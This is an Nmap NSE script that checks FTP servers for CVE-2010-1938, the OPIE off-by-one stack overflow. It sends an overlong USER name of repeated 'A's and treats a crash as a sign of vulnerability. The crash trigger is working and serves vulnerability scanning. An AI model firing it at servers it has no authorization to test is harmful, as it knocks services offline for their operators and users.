description = [[
Checks if an FTPd is prone to CVE-2010-1938 (OPIE off-by-one stack overflow),
a vulnerability discovered by Maksymilian Arciemowicz and Adam "pi3" Zabrocki.
See the advisory at http://nmap.org/r/fbsd-sa-opie.
Be advised that, if launched against a vulnerable host, this script will crash the FTPd.
]]

---
-- @output
-- PORT   STATE SERVICE
-- 21/tcp open  ftp
-- | ftp-libopie: Warning: Looks like the service has crashed!
-- | Likely prone to CVE-2010-1938 (OPIE off-by-one stack overflow)
-- |_See http://security.freebsd.org/advisories/FreeBSD-SA-10:05.opie.asc


author = "Ange Gutek"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"vuln","intrusive"}

require "shortport"

portrule = shortport.port_or_service(21, "ftp")

action = function(host, port)
	local socket = nmap.new_socket()
	local result
	-- If we use more that 31 chars for username, ftpd will crash (quoted from the advisory).
	local user_account = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	local status = true

	local err_catch = function()
		socket:close()
	end

	local try = nmap.new_try(err_catch)

	socket:set_timeout(10000)
	try(socket:connect(host, port))

	-- First, try a safe User so that we are sure that everything is ok
	local payload = "USER opie\r\n"
	try(socket:send(payload))

	status, result = socket:receive_lines(1);
	if status and not (string.match(result,"^421")) then

		  -- Second, try the vulnerable user account
		  local payload = "USER " .. user_account .. "\r\n"
		  try(socket:send(payload))

		  status, result = socket:receive_lines(1);
		  if status then
			    return
		  else
		  -- if the server does not answer anymore we may have reached a stack overflow condition
		  return "Warning: Looks like the service has crashed!\nLikely prone to CVE-2010-1938 (OPIE off-by-one stack overflow)\nSee http://security.freebsd.org/advisories/FreeBSD-SA-10:05.opie.asc"
		  end
	else
		return
	end
end
